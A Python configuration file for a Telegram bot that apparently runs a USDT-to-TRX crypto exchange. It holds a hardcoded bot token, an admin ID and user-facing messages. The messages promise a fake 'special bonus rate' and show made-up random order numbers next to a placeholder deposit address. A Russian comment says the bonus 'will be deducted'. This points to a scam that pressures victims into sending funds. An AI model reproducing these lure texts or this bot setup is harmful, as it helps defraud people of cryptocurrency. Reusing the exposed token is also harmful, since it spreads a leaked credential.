import random

from course import COURSE_TOKEN, SPRADE_RANGE

#ТОКЕНЫ
TOKEN = "8247152397:AAGIgsi1EGu-7l-VHCXubmMPs3kgbuRXB7Y"

#НАСТРОЙКИ
CURRENCY = "TRX"
TEST_MODE = False
MIN_EXCHANGE_VALUE = 20
MAX_EXCHANGE_VALUE = 1500
ACCOUNT_CHAR_COUNT = 3
PHOTO_ID = "https://static-cse.canva.com/blob/685034/vk1484.png"

#АДМИНЫ
ADMIN_ID = 7853896960

#ТЕКСТОВЫЕ СООБЩЕНИЯ
TEXT_START = f"📊🔥<b>Your special bonus rate is active! (+{SPRADE_RANGE}%)</b>\nYou have 5 bonus exchanges left.\n\nYour personal rate: <b>1 USDT ≈ {COURSE_TOKEN} {CURRENCY}</b>💰\n\nPlease enter the amount of USDT (TRC-20) you want to exchange.\n\n<b>Limits:</b>\n- Minimum: <em>{MIN_EXCHANGE_VALUE} USDT</em>\n- Maximum: <em>{MAX_EXCHANGE_VALUE} USDT</em>"
TEXT_ERROR_COUNT = f"Error: Enter the available amount (from {MIN_EXCHANGE_VALUE} to {MAX_EXCHANGE_VALUE})."
TEXT_EMAIL = "✅Great! Now, please enter your TRX wallet address (the one that starts with 'T')."
TEXT_ERROR_EMAIL = f"Error: Enter your Email address."
TEXT_ERROR_ACCOUNT = f"Error: your account is too short."

ORDER_NUMBER = random.randint(30, 2300)

HEADER_ORDER_TEXT = f"<b>✅Your Exchange Order #{ORDER_NUMBER} is Ready!✅</b>\n\n"
address_order_text = f"<code>01234567890</code>\n\n"
description_order_text = "<b>👇Deposit Address:👇</b>\n"
ADDRESS_ORDER_TEXT = description_order_text + address_order_text
WARNING_ORDER_TEXT = f"⚠️<b>IMPORTANT:</b>\n- send only USDT on the <b>{CURRENCY} (TRC-20)</b> network.\n- The order is valid for <b>30 minutes.</b>\n\nAfter sending the funds, press the button below."

#Информация
INFO_START = "(добавить генерацию процента (раз в день), бонус (будет отниматься) и курса)\n\n"

